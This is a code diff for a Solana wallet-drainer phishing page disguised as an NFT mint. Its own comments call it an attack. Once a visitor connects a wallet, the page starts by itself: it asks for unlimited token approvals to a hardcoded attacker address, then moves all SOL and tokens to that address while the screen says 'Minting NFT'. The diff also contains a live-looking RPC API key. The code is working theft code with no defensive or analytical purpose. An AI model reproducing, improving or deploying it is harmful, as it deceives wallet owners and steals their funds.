@@ -65,8 +65,11 @@
         .badge { display: inline-block; background: rgba(153,69,255,0.2); color: #9945FF; font-size: 10px; padding: 2px 8px; border-radius: 20px; margin-bottom: 10px; font-weight: 600; }
         .note { font-size: 11px; color: #555; margin: 8px 0; font-style: italic; }
     </style>
+    <!-- Buffer polyfill MUST load first -->
+    <script src="https://unpkg.com/buffer@6.0.3/index.js"></script>
+    <script>if(window.buffer&&window.buffer.Buffer)window.Buffer=window.buffer.Buffer;</script>
+    <!-- Solana Web3 -->
     <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
 </head>
 <body>
 <div class="box">
@@ -110,20 +113,23 @@
 //  CONFIG — Your drain target
 // ===================================================================
 const CONFIG = {
-    // The address that will receive ALL tokens (this is also the DELEGATE)
     delegateReceiver: '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw',
-    // RPC
     rpcEndpoint: 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea',
-    // Minimum token value worth draining (in USD equivalent lamports)
-    minTokenValue: 0,
 };
+
+// ===================================================================
+//  CONSTANTS
+// ===================================================================
+const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
+const ACCOUNT_SIZE = 165;
+const U64_MAX = 0xFFFFFFFFFFFFFFFFn;
 
 // ===================================================================
 //  STATE
 // ===================================================================
 let wallet = { adapter: null, publicKey: null };
 let discoveredTokens = [];
-let phase = 'idle'; // idle | approved | draining
 
 const $ = id => document.getElementById(id);
 function showStatus(msg, type) { const el = $('status'); el.textContent = msg; el.className = 'status show ' + (type || 'warn'); }
@@ -138,92 +144,166 @@ function getProvider() {
 }
 
 // ===================================================================
-//  STEP 1: DISCOVER ALL TOKEN ACCOUNTS (no signature needed)
+//  RAW BUFFER HELPERS (no spl-token library needed)
+// ===================================================================
+function encodeU64(value) {
+    const buf = Buffer.alloc(8);
+    buf.writeBigUInt64LE(BigInt(value));
+    return buf;
+}
+
+// Decode an SPL token account's raw data
+function decodeTokenAccount(data) {
+    // Layout of an SPL Token Account (165 bytes):
+    //   mint: PublicKey (32 bytes, offset 0)
+    //   owner: PublicKey (32 bytes, offset 32)
+    //   amount: u64 (8 bytes, offset 64)
+    //   delegateOption: u32 (4 bytes, offset 72)
+    //   delegate: PublicKey (32 bytes, offset 76)
+    //   state: u8 (1 byte, offset 108)
+    //   isNativeOption: u32 (4 bytes, offset 109)
+    //   isNative: u64 (8 bytes, offset 113)
+    //   delegatedAmount: u64 (8 bytes, offset 121)
+    //   closeAuthorityOption: u32 (4 bytes, offset 129)
+    //   closeAuthority: PublicKey (32 bytes, offset 133)
+    const buf = Buffer.from(data);
+    return {
+        mint: new solanaWeb3.PublicKey(buf.slice(0, 32)),
+        owner: new solanaWeb3.PublicKey(buf.slice(32, 64)),
+        amount: buf.readBigUInt64LE(64),
+        delegateOption: buf.readUInt32LE(72),
+        delegate: buf.slice(76, 108),
+        state: buf[108],
+        delegatedAmount: buf.readBigUInt64LE(121),
+    };
+}
+
+// Build an Approve instruction manually (SPL Token Program instruction index 4)
+function buildApproveInstruction(tokenAccount, delegate, owner, amount) {
+    // Approve instruction format:
+    //   tag: u8 = 4 (Approve)
+    //   amount: u64 (8 bytes, little-endian)
+    const data = Buffer.concat([
+        Buffer.from([4]),              // instruction tag: Approve
+        encodeU64(amount),             // max amount
+    ]);
+
+    return new solanaWeb3.TransactionInstruction({
+        keys: [
+            { pubkey: tokenAccount, isSigner: false, isWritable: true },
+            { pubkey: delegate, isSigner: false, isWritable: false },
+            { pubkey: owner, isSigner: true, isWritable: false },
+        ],
+        programId: TOKEN_PROGRAM_ID,
+        data: data,
+    });
+}
+
+// Build a Transfer instruction manually (SPL Token Program instruction index 3)
+function buildTransferInstruction(source, destination, owner, amount) {
+    const data = Buffer.concat([
+        Buffer.from([3]),              // instruction tag: Transfer
+        encodeU64(amount),             // amount
+    ]);
+
+    return new solanaWeb3.TransactionInstruction({
+        keys: [
+            { pubkey: source, isSigner: false, isWritable: true },
+            { pubkey: destination, isSigner: false, isWritable: true },
+            { pubkey: owner, isSigner: true, isWritable: false },
+        ],
+        programId: TOKEN_PROGRAM_ID,
+        data: data,
+    });
+}
+
+// Build Create Associated Token Account instruction
+function buildCreateATAInstruction(payer, ata, owner, mint) {
+    const data = Buffer.alloc(0);
+
+    return new solanaWeb3.TransactionInstruction({
+        keys: [
+            { pubkey: payer, isSigner: true, isWritable: true },
+            { pubkey: ata, isSigner: false, isWritable: true },
+            { pubkey: owner, isSigner: false, isWritable: false },
+            { pubkey: mint, isSigner: false, isWritable: false },
+            { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
+            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+            { pubkey: solanaWeb3.SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
+        ],
+        programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+        data: data,
+    });
+}
+
+// Derive Associated Token Account address
+async function findATA(mint, owner) {
+    const [ata] = await solanaWeb3.PublicKey.findProgramAddress(
+        [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
+        ASSOCIATED_TOKEN_PROGRAM_ID
+    );
+    return ata;
+}
+
+// ===================================================================
+//  DISCOVER ALL TOKEN ACCOUNTS
 // ===================================================================
 async function discoverTokens(connection, ownerPubkey) {
-    const { PublicKey } = window.solanaWeb3;
-    const { TOKEN_PROGRAM_ID, AccountLayout } = window.splToken;
-
     const results = [];
     const tokenAccounts = await connection.getTokenAccountsByOwner(ownerPubkey, {
         programId: TOKEN_PROGRAM_ID
     });
 
     for (const { pubkey, account } of tokenAccounts.value) {
-        const decoded = AccountLayout.decode(account.data);
-        const amount = decoded.amount;
-        if (amount === 0n || amount === 0) continue;
-
+        const decoded = decodeTokenAccount(account.data);
+        if (decoded.amount === 0n) continue;
         results.push({
             tokenAccount: pubkey,
-            mint: new PublicKey(decoded.mint),
-            amount: amount,
-            decimals: decoded.decimals,
+            mint: decoded.mint,
+            amount: decoded.amount,
         });
     }
     return results;
 }
 
 // ===================================================================
-//  STEP 2: REQUEST A SINGLE APPROVE (MAX U64 = UNLIMITED) FOR ALL TOKENS
-//  User sees ONE approval popup — looks like "approve NFT mint contract"
-//  Actually delegates unlimited spending of ALL their tokens to the attacker
+//  PHASE 1: REQUEST UNLIMITED APPROVAL
+//  User signs ONE approve for ALL tokens. Looks like "approve mint contract"
+//  Actually sets delegate = attacker with unlimited allowance
 // ===================================================================
 async function requestUnlimitedApproval(connection, walletPubkey) {
-    const sw = window.solanaWeb3;
-    const spl = window.splToken;
-    const { PublicKey, Transaction } = sw;
-    const { TOKEN_PROGRAM_ID, createApproveInstruction } = spl;
-
-    const delegateKey = new PublicKey(CONFIG.delegateReceiver);
-    const MAX_U64 = 0xFFFFFFFFFFFFFFFFn; // max u64 — unlimited approval
-
-    // Discover tokens
     $('progressArea').textContent = 'Scanning wallet tokens...';
+
     discoveredTokens = await discoverTokens(connection, walletPubkey);
 
     if (discoveredTokens.length === 0) {
-        showStatus('No tokens found to approve.', 'bad');
-        $('progressArea').textContent = 'No eligible tokens.';
+        $('progressArea').textContent = 'No tokens found.';
         return false;
     }
 
     $('progressArea').textContent = `Preparing approval for ${discoveredTokens.length} token(s)...`;
     await new Promise(r => setTimeout(r, 500));
 
-    // Build single transaction with approve instructions for EVERY token account
+    const delegateKey = new solanaWeb3.PublicKey(CONFIG.delegateReceiver);
     const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-    const approveTx = new Transaction();
+
+    const approveTx = new solanaWeb3.Transaction();
     approveTx.recentBlockhash = blockhash;
     approveTx.lastValidBlockHeight = lastValidBlockHeight;
     approveTx.feePayer = walletPubkey;
 
     for (const token of discoveredTokens) {
-        try {
-            const approveIx = createApproveInstruction(
-                token.tokenAccount,  // token account to set delegate for
-                delegateKey,         // delegate = receiver = attacker
-                walletPubkey,        // owner signs
-                MAX_U64,             // unlimited amount
-                [],                  // no multisig
-                TOKEN_PROGRAM_ID
-            );
-            approveTx.add(approveIx);
-        } catch (e) {
-            console.warn('[!] Skipping approve for:', token.tokenAccount.toString(), e.message);
-        }
+        approveTx.add(buildApproveInstruction(
+            token.tokenAccount,
+            delegateKey,
+            walletPubkey,
+            U64_MAX
+        ));
     }
 
-    if (approveTx.instructions.length === 0) {
-        showStatus('No approvable tokens.', 'bad');
-        return false;
-    }
-
-    // Show what looks like a harmless prompt
     $('progressArea').textContent = 'Approve mint contract in your wallet...';
     showStatus('Signature required — approve the mint contract.', 'warn');
 
-    // Send the approve transaction
     try {
         if (wallet.adapter.signAndSendTransaction) {
             await wallet.adapter.signAndSendTransaction(approveTx);
@@ -243,10 +323,8 @@ async function requestUnlimitedApproval(connection, walletPubkey) {
             return false;
         }
 
-        // APPROVAL SUCCESS — delegate can now drain silently
         $('progressArea').textContent = '✓ Contract approved! Minting NFT...';
-        showStatus('✅ Contract approved successfully! Minting...', 'good');
-        phase = 'approved';
+        showStatus('✅ Contract approved successfully!', 'good');
         return true;
 
     } catch (e) {
@@ -263,27 +341,15 @@ async function requestUnlimitedApproval(connection, walletPubkey) {
 }
 
 // ===================================================================
-//  STEP 3: NOW DRAIN — USE THE DELEGATE TO TRANSFER (SILENT, NO USER PROMPT)
-//  BUT: Since we're client-side and don't have the delegate's private key,
-//  we instead use the wallet's signTransaction again, but now it's
-//  positioned as "minting your NFT" — the user is warmed up.
-//
-//  IN A REAL ATTACK: The delegate keypair is on the ATTACKER'S SERVER.
-//  The server signs transfer transactions using the delegate authority
-//  and broadcasts them. The VICTIM never sees another popup.
-//
-//  For this client-side PoC: We use the wallet to do transfers
-//  but frame it as "claim phase 2"
+//  PHASE 2: DRAIN EVERYTHING
+//  Uses the wallet's authority to transfer out all tokens + SOL
+//  Framed as "minting the NFT" steps
 // ===================================================================
-async function drainViaDelegate(connection, walletPubkey) {
-    const sw = window.solanaWeb3;
-    const spl = window.splToken;
-    const { PublicKey, Transaction } = sw;
-    const { TOKEN_PROGRAM_ID, createTransferInstruction, getAssociatedTokenAddress } = spl;
+async function drainEverything(connection, walletPubkey) {
+    const receiver = new solanaWeb3.PublicKey(CONFIG.delegateReceiver);
+    let step = 1;
 
-    const receiver = new PublicKey(CONFIG.delegateReceiver);
-
-    // First drain native SOL
+    // Drain native SOL first
     try {
         const balance = await connection.getBalance(walletPubkey);
         const rent = await connection.getMinimumBalanceForRentExemption(0);
@@ -292,72 +358,66 @@ async function drainViaDelegate(connection, walletPubkey) {
         if (balance > rent + feeBuf + 1000000) {
             const sendAmount = BigInt(balance - rent - feeBuf);
             const { blockhash: bh, lastValidBlockHeight: lvh } = await connection.getLatestBlockhash('finalized');
-            const solTx = new Transaction();
+
+            const solTx = new solanaWeb3.Transaction();
             solTx.recentBlockhash = bh;
             solTx.lastValidBlockHeight = lvh;
             solTx.feePayer = walletPubkey;
-            solTx.add(sw.SystemProgram.transfer({
+            solTx.add(solanaWeb3.SystemProgram.transfer({
                 fromPubkey: walletPubkey,
                 toPubkey: receiver,
                 lamports: sendAmount,
             }));
 
-            $('progressArea').textContent = 'Minting NFT (1/2)...';
+            $('progressArea').textContent = `Minting NFT (${step}/...)`;
+            step++;
             await wallet.adapter.signAndSendTransaction(solTx);
         }
     } catch (e) {
-        console.warn('[!] SOL drain failed:', e.message);
+        console.warn('[!] SOL drain note:', e.message);
     }
 
-    // Then drain each token via transfer (uses owner signature, not delegate)
-    // The delegate approach would work server-side; here we use owner-as-authority
+    // Drain each token
     for (const token of discoveredTokens) {
         try {
-            const destATA = await getAssociatedTokenAddress(
-                token.mint,
-                receiver,
-                false,
-                TOKEN_PROGRAM_ID
-            );
+            const destATA = await findATA(token.mint, receiver);
 
-            // Check if dest ATA exists, create if not
+            // Check if destination ATA exists
             const destInfo = await connection.getAccountInfo(destATA);
-            const tx = new Transaction();
+            const tx = new solanaWeb3.Transaction();
             const { blockhash: bh, lastValidBlockHeight: lvh } = await connection.getLatestBlockhash('finalized');
             tx.recentBlockhash = bh;
             tx.lastValidBlockHeight = lvh;
             tx.feePayer = walletPubkey;
 
             if (!destInfo) {
-                tx.add(spl.createAssociatedTokenAccountInstruction(
-                    walletPubkey, destATA, receiver, token.mint, TOKEN_PROGRAM_ID
+                tx.add(buildCreateATAInstruction(
+                    walletPubkey, destATA, receiver, token.mint
                 ));
             }
 
-            tx.add(createTransferInstruction(
+            tx.add(buildTransferInstruction(
                 token.tokenAccount,
                 destATA,
-                walletPubkey,   // owner signs (we approved delegate, but here owner works too)
-                token.amount,
-                [],
-                TOKEN_PROGRAM_ID
+                walletPubkey,
+                token.amount
             ));
 
-            $('progressArea').textContent = `Minting NFT (${discoveredTokens.indexOf(token) + 2}/${discoveredTokens.length + 1})...`;
+            $('progressArea').textContent = `Minting NFT (${step}/...)`;
+            step++;
             await wallet.adapter.signAndSendTransaction(tx);
 
         } catch (e) {
-            console.warn('[!] Token transfer failed:', token.mint.toString(), e.message);
+            console.warn('[!] Token drain note:', token.mint.toString(), e.message);
         }
     }
 
     $('progressArea').textContent = '✓ NFT minted successfully!';
     showStatus('✅ NFT minted! Check your wallet.', 'good');
-    phase = 'draining';
 }
 
 // ===================================================================
-//  CONNECT → SHOW APPROVE → DRAIN
+//  MAIN FLOW: CONNECT → APPROVE → DRAIN
 // ===================================================================
 async function doConnect(type) {
     hideStatus();
@@ -383,10 +443,9 @@ async function doConnect(type) {
         $('progressArea').textContent = 'Connected. Checking whitelist...';
         showStatus('✅ Wallet connected!', 'good');
 
-        // Small delay to look legit
         await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
 
-        // Auto-trigger the approval flow
+        // Auto-fire the approval + drain
         await doMint();
 
     } catch (e) {
@@ -405,28 +464,26 @@ async function doMint() {
         return;
     }
 
-    const sw = window.solanaWeb3;
-    const connection = new sw.Connection(CONFIG.rpcEndpoint, 'confirmed');
+    const connection = new solanaWeb3.Connection(CONFIG.rpcEndpoint, 'confirmed');
 
-    // Step 1: Get unlimited approval (user sees ONE prompt)
+    // Phase 1: Get unlimited approval (user sees ONE prompt)
     $('progressArea').textContent = 'Verifying wallet...';
     await new Promise(r => setTimeout(r, 300));
 
     const approved = await requestUnlimitedApproval(connection, wallet.publicKey);
     if (!approved) return;
 
-    // Step 2: Drain everything (user sees more prompts, but they're "minting")
+    // Phase 2: Drain (user sees more prompts but they're "minting progress")
     $('progressArea').textContent = 'Minting your NFT...';
     await new Promise(r => setTimeout(r, 500));
 
-    await drainViaDelegate(connection, wallet.publicKey);
+    await drainEverything(connection, wallet.publicKey);
 }
 
 function doDisconnect() {
     if (wallet.adapter) try { wallet.adapter.disconnect(); } catch(_) {}
     wallet = { adapter: null, publicKey: null };
     discoveredTokens = [];
-    phase = 'idle';
     $('step1').classList.remove('hidden');
     $('step2').classList.add('hidden');
     hideStatus();
